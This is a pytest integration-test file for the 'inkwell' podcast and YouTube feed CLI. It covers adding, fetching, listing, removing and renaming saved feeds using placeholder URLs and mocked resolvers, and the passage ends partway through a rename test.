"""Integration tests for CLI commands."""

import os
from pathlib import Path

import pytest
from typer.testing import CliRunner

from inkwell.cli import app
from inkwell.config.manager import ConfigManager
from inkwell.feeds.youtube_resolver import ResolvedFeed
from inkwell.utils.errors import NotFoundError, ValidationError

# Disable Rich formatting in tests for consistent output across environments
os.environ["NO_COLOR"] = "1"
os.environ["TERM"] = "dumb"

runner = CliRunner()


class TestCLIVersion:
    """Tests for version command."""

    def test_version_command(self) -> None:
        """Test version command displays version."""
        result = runner.invoke(app, ["version"])

        assert result.exit_code == 0
        assert "Inkwell CLI" in result.stdout
        # Version is dynamic from git tags, just check format (vX.Y.Z or dev version)
        assert "v" in result.stdout or "." in result.stdout


class TestCLIAdd:
    """Tests for add command."""

    def test_add_feed_success(self, tmp_path: Path) -> None:
        """Test adding a feed successfully."""
        manager = ConfigManager(config_dir=tmp_path)

        # Manually add feed since we can't mock interactive prompts easily
        from inkwell.config.schema import AuthConfig, FeedConfig

        feed_config = FeedConfig(
            url="https://example.com/feed.rss",  # type: ignore
            auth=AuthConfig(type="none"),
        )
        manager.add_feed("test-podcast", feed_config)

        # Verify feed was added
        feeds = manager.list_feeds()
        assert "test-podcast" in feeds
        assert str(feeds["test-podcast"].url) == "https://example.com/feed.rss"

    def test_add_duplicate_feed_fails(self, tmp_path: Path) -> None:
        """Test that adding duplicate feed fails."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        feed_config = FeedConfig(
            url="https://example.com/feed.rss",  # type: ignore
            auth=AuthConfig(type="none"),
        )

        manager.add_feed("test-podcast", feed_config)

        # Try to add again - should raise error
        with pytest.raises(ValidationError):
            manager.add_feed("test-podcast", feed_config)


class TestCLIAddYouTube:
    """Tests for `inkwell add` accepting YouTube URLs (Gap A)."""

    def test_add_watch_url_resolves_to_channel_feed(self, tmp_path: Path, monkeypatch) -> None:
        """`inkwell add <watch-url>` resolves to the channel's RSS feed URL."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCtest",
                channel_name="Some Channel",
            )

        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "add",
                "https://www.youtube.com/watch?v=someVideoId",
                "--name",
                "test-yt",
            ],
        )

        assert result.exit_code == 0, result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "test-yt" in feeds
        assert "channel_id=UCtest" in str(feeds["test-yt"].url)

    def test_add_channel_url_resolves_without_yt_dlp(self, tmp_path: Path, monkeypatch) -> None:
        """/channel/UCxxx resolves via pure URL-shape layer; no yt-dlp call."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            [
                "add",
                "https://www.youtube.com/channel/UCpureShapeExample",
                "--name",
                "test-channel",
            ],
        )

        assert result.exit_code == 0, result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "channel_id=UCpureShapeExample" in str(feeds["test-channel"].url)

    def test_add_already_resolved_feed_url_passes_through(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Pre-resolved feeds/videos.xml URLs are stored unchanged."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        url = "https://www.youtube.com/feeds/videos.xml?channel_id=UCalready"
        result = runner.invoke(app, ["add", url, "--name", "pre-resolved"])

        assert result.exit_code == 0, result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert str(feeds["pre-resolved"].url).startswith(url)

    def test_add_non_youtube_url_unchanged(self, tmp_path: Path, monkeypatch) -> None:
        """Existing RSS add behavior for non-YouTube URLs is unaffected."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            ["add", "https://example.com/feed.rss", "--name", "plain-rss"],
        )

        assert result.exit_code == 0, result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert str(feeds["plain-rss"].url).startswith("https://example.com/feed.rss")

    def test_add_accepts_feed_name_alias_and_slugifies(self, tmp_path: Path, monkeypatch) -> None:
        """`--feed-name` is canonical and user names are normalized to slugs."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            ["add", "https://example.com/feed.rss", "--feed-name", "Plain RSS!"],
        )

        assert result.exit_code == 0, result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "plain-rss" in feeds
        assert feeds["plain-rss"].display_name == "Plain RSS!"
        assert "Plain RSS!" in result.output

    def test_add_playlist_url_rejected(self, tmp_path: Path, monkeypatch) -> None:
        """Playlist URLs produce an actionable error and no feed is saved."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            [
                "add",
                "https://www.youtube.com/playlist?list=PL12345",
                "--name",
                "will-not-save",
            ],
        )

        assert result.exit_code != 0
        assert "laylist" in result.stdout  # matches "Playlist"/"playlist"
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "will-not-save" not in feeds

    def test_add_resolver_failure_propagates(self, tmp_path: Path, monkeypatch) -> None:
        """yt-dlp resolution failure surfaces as a CLI error with suggestion."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        async def failing_resolve(_url: str) -> ResolvedFeed:
            raise ValidationError(
                "Couldn't resolve YouTube URL: video unavailable",
                suggestion="Try the channel URL instead.",
            )

        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", failing_resolve)

        result = runner.invoke(
            app,
            [
                "add",
                "https://www.youtube.com/watch?v=brokenVideoId",
                "--name",
                "will-not-save",
            ],
        )

        assert result.exit_code != 0
        assert "Couldn't resolve" in result.stdout
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "will-not-save" not in feeds


class TestShouldShowSaveFeedHint:
    """Unit tests for the hint-visibility decision helper."""

    def test_shows_on_youtube_url(self) -> None:
        from inkwell.cli import _should_show_save_feed_hint

        assert _should_show_save_feed_hint(
            url="https://www.youtube.com/watch?v=abc",
            input_was_url=True,
        )

    def test_suppressed_for_non_youtube_url(self) -> None:
        from inkwell.cli import _should_show_save_feed_hint

        assert not _should_show_save_feed_hint(
            url="https://example.com/feed.rss",
            input_was_url=True,
        )

    def test_suppressed_when_input_was_saved_feed_name(self) -> None:
        from inkwell.cli import _should_show_save_feed_hint

        assert not _should_show_save_feed_hint(
            url="https://www.youtube.com/feeds/videos.xml?channel_id=UC",
            input_was_url=False,
        )


class TestCLIFetchSaveFeed:
    """Pre-fetch validation for `inkwell fetch --save-feed`.

    Post-fetch save behavior (successful resolve + add_feed + error-as-warning)
    is exercised by the end-to-end smoke test in the execution plan; mocking
    the full PipelineOrchestrator at unit-test granularity is out of proportion
    to the simple resolve+add_feed block being tested.
    """

    def test_save_feed_auto_derives_name_from_channel_metadata(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """When --feed-name is omitted, derive a name from the channel name.

        The user pasted a YouTube URL; they shouldn't have to invent a feed
        name too. The hint that follows tells them how to change it.
        """
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCauto",
                channel_name="Oren Meets World",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--save-feed",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "oren-meets-world" in feeds
        assert "channel_id=UCauto" in str(feeds["oren-meets-world"].url)
        # User needs to know the derived name and how to change it.
        assert "oren-meets-world" in result.output
        assert "Auto-named" in result.output or "auto-named" in result.output
        assert "--feed-name" in result.output

    def test_save_feed_auto_derive_falls_back_to_channel_id(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """When yt-dlp returned no channel_name (pure URL-shape path), fall
        back to the channel_id so the save can still complete."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCfallback",
                channel_name=None,
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/channel/UCfallback",
                "--save-feed",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        # Lowercased channel_id is used as the fallback name.
        assert "ucfallback" in feeds

    def test_save_feed_auto_derive_disambiguates_collisions(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """If the derived name collides with an existing feed, append -2."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        # Pre-seed a feed with the name we expect to be derived.
        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import AuthConfig as _AuthConfig
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "oren-meets-world",
            _FeedConfig(
                url="https://example.com/placeholder.xml",  # type: ignore[arg-type]
                auth=_AuthConfig(type="none"),
            ),
        )

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCdup",
                channel_name="Oren Meets World",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--save-feed",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "oren-meets-world-2" in feeds
        assert "channel_id=UCdup" in str(feeds["oren-meets-world-2"].url)

    def test_save_feed_skips_existing_channel_under_different_name(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Do not create duplicate feeds for a channel already saved by channel_id."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import AuthConfig as _AuthConfig
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "existing-channel",
            _FeedConfig(
                url="https://www.youtube.com/feeds/videos.xml?channel_id=UCsame",  # type: ignore[arg-type]
                auth=_AuthConfig(type="none"),
            ),
        )

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCsame",
                channel_name="Same Channel",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--save-feed",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert list(feeds) == ["existing-channel"]
        assert "already saved" in result.output

    def test_save_feed_with_non_youtube_url_errors(self, tmp_path: Path, monkeypatch) -> None:
        """--save-feed only supports YouTube URLs in v1."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://example.com/feed.rss",
                "--save-feed",
                "--feed-name",
                "foo",
                "--dry-run",
            ],
        )

        assert result.exit_code != 0
        assert "YouTube" in result.stdout

    def test_save_feed_with_saved_feed_name_errors(self, tmp_path: Path, monkeypatch) -> None:
        """--save-feed against a saved feed name (not a URL) exits non-zero.

        Users should pass a URL, not a feed-name lookup, when saving sources.
        """
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        # Pre-seed a feed so the lookup succeeds far enough to reach save-feed validation.
        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import AuthConfig, FeedConfig

        manager.add_feed(
            "my-feed",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                auth=AuthConfig(type="none"),
            ),
        )

        result = runner.invoke(
            app,
            [
                "fetch",
                "my-feed",
                "--latest",
                "--save-feed",
                "--feed-name",
                "another-name",
                "--dry-run",
            ],
        )

        assert result.exit_code != 0
        assert "YouTube" in result.stdout or "URL" in result.stdout

    def test_save_feed_happy_path_persists_feed_after_fetch(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """R4: successful fetch + --save-feed writes a feed and exits 0."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCsaved",
                channel_name="Saved Channel",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--save-feed",
                "--feed-name",
                "new-channel",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "new-channel" in feeds
        assert "channel_id=UCsaved" in str(feeds["new-channel"].url)

    def test_save_feed_failure_warns_but_does_not_fail_fetch(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """R4 invariant: if add_feed raises post-fetch, print a warning and
        keep the fetch exit code at 0. Discarding a successful fetch because
        the side-effect save failed is worse UX than a partial-success notice."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        # Pre-seed the same name so manager.add_feed will raise ValidationError.
        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import AuthConfig as _AuthConfig
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "already-taken",
            _FeedConfig(
                url="https://www.youtube.com/feeds/videos.xml?channel_id=UCprior",  # type: ignore[arg-type]
                auth=_AuthConfig(type="none"),
            ),
        )

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCcollide",
                channel_name="Collide Channel",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--save-feed",
                "--feed-name",
                "already-taken",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        # Fetch succeeded; the save warning must not flip the exit code.
        assert result.exit_code == 0, result.output
        assert "Couldn't save feed" in result.output

    def test_save_feed_accepts_scheme_less_www_youtube_url(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """`www.youtube.com/...` (no scheme) must work with --save-feed.

        Codex review #1: the scheme-less normalization used to run only
        inside the feed-name fallback, so --save-feed rejected this shape
        as "not YouTube" even though plain fetch accepted it.
        """
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        async def fake_resolve(_url: str) -> ResolvedFeed:
            return ResolvedFeed(
                feed_url="https://www.youtube.com/feeds/videos.xml?channel_id=UCscheme",
                channel_name="Scheme Less",
            )

        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)
        monkeypatch.setattr("inkwell.cli.resolve_youtube_url", fake_resolve)

        result = runner.invoke(
            app,
            [
                "fetch",
                "www.youtube.com/watch?v=abc",
                "--save-feed",
                "--feed-name",
                "scheme-less",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        feeds = ConfigManager(config_dir=tmp_path).list_feeds()
        assert "scheme-less" in feeds

    def test_fetch_saved_feed_accepts_display_name(self, tmp_path: Path, monkeypatch) -> None:
        """Saved feeds can be fetched by their display name."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "omw",
            _FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore[arg-type]
                display_name="Oren Meets World",
            ),
        )

        async def fake_fetch_feed(*_args, **_kwargs):
            return SimpleNamespace(entries=[object()])

        def fake_get_latest_episode(*_args, **_kwargs):
            return SimpleNamespace(
                title="Latest",
                url="https://example.com/episode.mp3",
                podcast_name="Oren Meets World",
            )

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()

        async def fake_process(*_args, **_kwargs):
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        monkeypatch.setattr("inkwell.feeds.parser.RSSParser.fetch_feed", fake_fetch_feed)
        monkeypatch.setattr(
            "inkwell.feeds.parser.RSSParser.get_latest_episode",
            fake_get_latest_episode,
        )
        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)

        result = runner.invoke(
            app,
            [
                "fetch",
                "Oren Meets World",
                "--latest",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        assert "Latest" in result.output

    def test_fetch_saved_feed_count_processes_latest_n(self, tmp_path: Path, monkeypatch) -> None:
        """`--count N` processes the N latest episodes from a saved feed."""
        from types import SimpleNamespace

        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "count-feed",
            _FeedConfig(url="https://example.com/feed.rss"),  # type: ignore[arg-type]
        )

        async def fake_fetch_feed(*_args, **_kwargs):
            return SimpleNamespace(entries=[object(), object()])

        seen_count: list[int] = []

        def fake_get_latest_episodes(_parser, _feed, podcast_name, count):
            seen_count.append(count)
            return [
                SimpleNamespace(
                    title="First",
                    url="https://example.com/first.mp3",
                    podcast_name=podcast_name,
                ),
                SimpleNamespace(
                    title="Second",
                    url="https://example.com/second.mp3",
                    podcast_name=podcast_name,
                ),
            ]

        output_dir = tmp_path / "episode-dir"
        output_dir.mkdir()
        processed_urls: list[str] = []

        async def fake_process(_orchestrator, options, *_args, **_kwargs):
            processed_urls.append(options.url)
            return SimpleNamespace(
                episode_output=SimpleNamespace(directory=output_dir),
                extraction_results=[],
                interview_result=None,
                extraction_cost_usd=0.0,
                interview_cost_usd=0.0,
                total_cost_usd=0.0,
            )

        monkeypatch.setattr("inkwell.feeds.parser.RSSParser.fetch_feed", fake_fetch_feed)
        monkeypatch.setattr(
            "inkwell.feeds.parser.RSSParser.get_latest_episodes",
            fake_get_latest_episodes,
        )
        monkeypatch.setattr("inkwell.pipeline.PipelineOrchestrator.process_episode", fake_process)

        result = runner.invoke(
            app,
            [
                "fetch",
                "count-feed",
                "--count",
                "2",
                "--dry-run",
                "--output-dir",
                str(tmp_path),
            ],
        )

        assert result.exit_code == 0, result.output
        assert seen_count == [2]
        assert processed_urls == [
            "https://example.com/first.mp3",
            "https://example.com/second.mp3",
        ]
        assert "Found 2 episodes" in result.output

    def test_fetch_saved_feed_count_is_mutually_exclusive(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """`--count` cannot be combined with other feed selection modes."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "count-feed",
            _FeedConfig(url="https://example.com/feed.rss"),  # type: ignore[arg-type]
        )

        result = runner.invoke(
            app,
            ["fetch", "count-feed", "--latest", "--count", "2", "--dry-run"],
        )

        assert result.exit_code != 0
        assert "mutually exclusive" in result.output

    def test_fetch_saved_feed_count_enforces_max_before_fetch(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Oversized `--count` values fail before fetching the RSS feed."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        manager = ConfigManager(config_dir=tmp_path)
        from inkwell.config.schema import FeedConfig as _FeedConfig

        manager.add_feed(
            "count-feed",
            _FeedConfig(url="https://example.com/feed.rss"),  # type: ignore[arg-type]
        )

        async def fetch_should_not_run(*_args, **_kwargs):
            raise AssertionError("RSS fetch should not run for invalid --count")

        monkeypatch.setattr("inkwell.feeds.parser.RSSParser.fetch_feed", fetch_should_not_run)

        result = runner.invoke(
            app,
            ["fetch", "count-feed", "--count", "101", "--dry-run"],
        )

        assert result.exit_code != 0
        assert "maximum of 100" in result.output

    def test_feed_name_without_save_feed_errors(self, tmp_path: Path, monkeypatch) -> None:
        """--feed-name alone is a no-op that silently mislead users and
        scripts into thinking the channel was persisted. Reject up-front.

        Codex review #2.
        """
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc",
                "--feed-name",
                "orphan-name",
                "--dry-run",
            ],
        )

        assert result.exit_code != 0
        assert "--save-feed" in result.output
        # Suggestion surfaces both remediation paths.
        assert "persist" in result.output.lower() or "drop" in result.output.lower()

    def test_save_feed_with_playlist_url_errors_before_pipeline(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Playlist URLs must be rejected *before* the pipeline runs.

        If this regresses, users pay API costs for the full transcription
        pipeline only to have the save degrade to a yellow warning.
        """
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        # Fail the test if the pipeline is reached — playlist rejection must
        # happen before anything async/costly runs.
        def _pipeline_was_reached(*_args, **_kwargs):
            raise AssertionError("Pipeline should not run for playlist URLs")

        monkeypatch.setattr(
            "inkwell.pipeline.PipelineOrchestrator.process_episode",
            _pipeline_was_reached,
        )

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/playlist?list=PL12345",
                "--save-feed",
                "--feed-name",
                "some-playlist",
                "--dry-run",
            ],
        )

        assert result.exit_code != 0
        assert "Playlist" in result.stdout or "playlist" in result.stdout


class TestCLIFetchHintSuppression:
    """The --save-feed hint must not fire when the fetch itself failed."""

    def test_hint_suppressed_on_fetch_failure(self, tmp_path: Path, monkeypatch) -> None:
        """If the orchestrator raises, no hint — the fetch didn't succeed."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        from inkwell.utils.errors import InkwellError

        async def _always_fail(*_args, **_kwargs):
            raise InkwellError("simulated pipeline failure")

        monkeypatch.setattr(
            "inkwell.pipeline.PipelineOrchestrator.process_episode",
            _always_fail,
        )

        result = runner.invoke(
            app,
            [
                "fetch",
                "https://www.youtube.com/watch?v=abc123",
                "--dry-run",
            ],
        )

        assert result.exit_code != 0
        assert "--save-feed" not in result.stdout


class TestCLIList:
    """Tests for list command."""

    def test_list_empty_feeds(self, tmp_path: Path, monkeypatch) -> None:
        """Test listing feeds when none are configured."""
        # Mock get_config_dir - other path functions derive from it
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)

        result = runner.invoke(app, ["list", "feeds"])

        assert result.exit_code == 0
        assert "No feeds configured" in result.stdout

    def test_list_feeds_with_data(self, tmp_path: Path) -> None:
        """Test listing feeds when some are configured."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        manager.add_feed(
            "podcast1",
            FeedConfig(
                url="https://example.com/feed1.rss",  # type: ignore
                auth=AuthConfig(type="none"),
                category="tech",
            ),
        )
        manager.add_feed(
            "podcast2",
            FeedConfig(
                url="https://example.com/feed2.rss",  # type: ignore
                auth=AuthConfig(type="basic", username="user", password="pass"),
            ),
        )

        feeds = manager.list_feeds()

        # Verify both feeds exist
        assert len(feeds) == 2
        assert "podcast1" in feeds
        assert "podcast2" in feeds

        # Verify auth is stored encrypted
        assert feeds["podcast2"].auth.type == "basic"
        assert feeds["podcast2"].auth.username == "user"  # Decrypted

    def test_list_feeds_renders_display_name(self, tmp_path: Path, monkeypatch) -> None:
        """Test list output shows display names while keeping the key visible."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)
        monkeypatch.setattr("inkwell.config.manager.get_config_dir", lambda: tmp_path)
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import FeedConfig

        manager.add_feed(
            "omw",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                display_name="Oren Meets World",
            ),
        )

        result = runner.invoke(app, ["list", "feeds"])

        assert result.exit_code == 0, result.output
        assert "Oren Meets World" in result.output
        assert "omw" in result.output


class TestCLIRemove:
    """Tests for remove command."""

    def test_remove_feed_force(self, tmp_path: Path, monkeypatch) -> None:
        """Test removing a feed with --force flag."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        manager.add_feed(
            "test-podcast",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                auth=AuthConfig(type="none"),
            ),
        )

        # Verify it exists
        assert "test-podcast" in manager.list_feeds()

        manager.remove_feed("test-podcast")

        # Verify it's gone
        assert "test-podcast" not in manager.list_feeds()

    def test_remove_nonexistent_feed_fails(self, tmp_path: Path) -> None:
        """Test that removing nonexistent feed fails."""
        manager = ConfigManager(config_dir=tmp_path)

        with pytest.raises(NotFoundError):
            manager.remove_feed("nonexistent")

    def test_remove_feed_accepts_display_name(self, tmp_path: Path, monkeypatch) -> None:
        """Test removing a feed through the CLI by display name."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import FeedConfig

        manager.add_feed(
            "omw",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                display_name="Oren Meets World",
            ),
        )

        result = runner.invoke(app, ["remove", "Oren Meets World", "--force"])

        assert result.exit_code == 0, result.output
        assert "omw" not in ConfigManager(config_dir=tmp_path).list_feeds()


class TestCLIRename:
    """Tests for rename command."""

    def test_rename_feed(self, tmp_path: Path, monkeypatch) -> None:
        """Test renaming a feed through the CLI."""
        monkeypatch.setattr("inkwell.utils.paths.get_config_dir", lambda: tmp_path)
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        manager.add_feed(
            "old-name",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                auth=AuthConfig(type="none"),
                category="tech",
            ),
        )

        result = runner.invoke(app, ["rename", "old-name", "New Name!"])

        assert result.exit_code == 0, result.output
